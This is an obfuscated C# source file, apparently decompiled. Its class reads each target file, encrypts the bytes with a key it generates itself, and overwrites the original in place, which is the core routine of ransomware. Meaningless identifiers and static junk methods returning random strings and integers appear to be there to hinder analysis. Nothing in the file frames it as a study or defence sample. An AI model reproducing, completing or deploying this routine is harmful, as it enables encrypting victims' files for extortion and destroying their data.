using System;
using System.IO;

namespace hkyiuiuljll;

internal class fp : ifp
{
	private iep GK1vEIj8gpqoeKOFuTDChp7GlzmktN8tluEqvIKbqXJ4jVZ4N9kS67fmnrZLuEh8h;

	private byte[] byte_0;

	public fp(iep iep_0)
	{
		GK1vEIj8gpqoeKOFuTDChp7GlzmktN8tluEqvIKbqXJ4jVZ4N9kS67fmnrZLuEh8h = iep_0;
		byte_0 = GK1vEIj8gpqoeKOFuTDChp7GlzmktN8tluEqvIKbqXJ4jVZ4N9kS67fmnrZLuEh8h.CreateEncryptionKey();
	}

	public void ParseFile(string Zx5hBykeK44rqIpecvZrtbcwAtid4omHhrt623rexraB9QtX7HkC07q3)
	{
		byte[] fileBytes = GetFileBytes(Zx5hBykeK44rqIpecvZrtbcwAtid4omHhrt623rexraB9QtX7HkC07q3);
		byte[] jLvUYkdYT5b6wxjwy4FsCJUPIIaK6NmHdgfF166PgoZK2TranXQVwfL88Kfzdb = GK1vEIj8gpqoeKOFuTDChp7GlzmktN8tluEqvIKbqXJ4jVZ4N9kS67fmnrZLuEh8h.EncryptBytes(fileBytes, byte_0);
		WriteFileBytes(Zx5hBykeK44rqIpecvZrtbcwAtid4omHhrt623rexraB9QtX7HkC07q3, jLvUYkdYT5b6wxjwy4FsCJUPIIaK6NmHdgfF166PgoZK2TranXQVwfL88Kfzdb);
		Path.GetExtension(Zx5hBykeK44rqIpecvZrtbcwAtid4omHhrt623rexraB9QtX7HkC07q3);
		GC.Collect();
	}

	private byte[] GetFileBytes(string WDcBLmiZySDMFt28nxJOEDfFNqFMiLakJiEcyVxFXkLGHq6oPJRzxzVg7u7Ov9us)
	{
		using FileStream fileStream = File.OpenRead(WDcBLmiZySDMFt28nxJOEDfFNqFMiLakJiEcyVxFXkLGHq6oPJRzxzVg7u7Ov9us);
		byte[] array = new byte[fileStream.Length];
		try
		{
			fileStream.Read(array, 0, Convert.ToInt32(fileStream.Length));
			fileStream.Close();
			return array;
		}
		finally
		{
			fileStream.Close();
		}
	}

	private void WriteFileBytes(string PzClW1XFMsDxKT2OJfUcJHieggnic2m1SLOMb4KLttJsD39sxX16IWOXtd, byte[] JLvUYkdYT5b6wxjwy4FsCJUPIIaK6NmHdgfF166PgoZK2TranXQVwfL88Kfzdb)
	{
		using FileStream fileStream = File.OpenWrite(PzClW1XFMsDxKT2OJfUcJHieggnic2m1SLOMb4KLttJsD39sxX16IWOXtd);
		if (fileStream.CanWrite)
		{
			fileStream.Write(JLvUYkdYT5b6wxjwy4FsCJUPIIaK6NmHdgfF166PgoZK2TranXQVwfL88Kfzdb, 0, Convert.ToInt32(JLvUYkdYT5b6wxjwy4FsCJUPIIaK6NmHdgfF166PgoZK2TranXQVwfL88Kfzdb.Length));
		}
	}

	public static string FYmyml832NMSpKg9WIgnU8jXs3d3CV2xi78ggEZDfn0aDJI8hY()
	{
		return "lPkqRI4ZgERyBiup5gSKRLBIgd9ruwJxZSLsQsR38Cobwc2Ht232eOpvFdyJuhM";
	}

	public static int GH6LHJPLFpQjhHXfojuKAoTxLyZfJu4GXHTjlL4zOeh1jupJno()
	{
		return 906264486;
	}

	public static string eLuqc3KgSSA06yYEU9WbtzMvYIbWJJY3dlTJIMgFCnFtPyW6w3()
	{
		return "fk6RMLpvlzB7m4PhoqpV4L51zQXKokUR30B5AfgNBXon30NaSscbWWbcAsw9M64m8f";
	}

	public static int qva7nYdeyExbKSwFmJzIsZSFHLSauWPyQ2etDZtV92jIvInYo7()
	{
		return 439802929;
	}

	public static string kpsfL2UF0m8no1E8YzJCPuYe71Ssmx2q4SG3IwTmENP8JK9bhc()
	{
		return "PMJ31Ro0d3oj5cYY1Pw13Q35EzkeaYUh7JBR2P5koAa4hks9Of2pAmB7FpQF";
	}

	public static int zpYhQPKPUEolaw5BZAW6dMXlf9ug8cx2UGx1dgtHG19yKUBWbE()
	{
		return 68789008;
	}

	public static string iIkyczNCc4Q54CumhrKoRG95teQ0QI3iCKsY6WA2Ax6MwtgLdf()
	{
		return "wKt7MuO2VomsnZZvXiDfg8RRQxw2FL9FiHmcWsntwgNdqsYtdRcIxcjW1ur";
	}

	public static int BAhcKBAFe37rWhl6iSdhLkE09f09xR8jfA2TYpLmKAeobqrSPi()
	{
		return 897901996;
	}
}
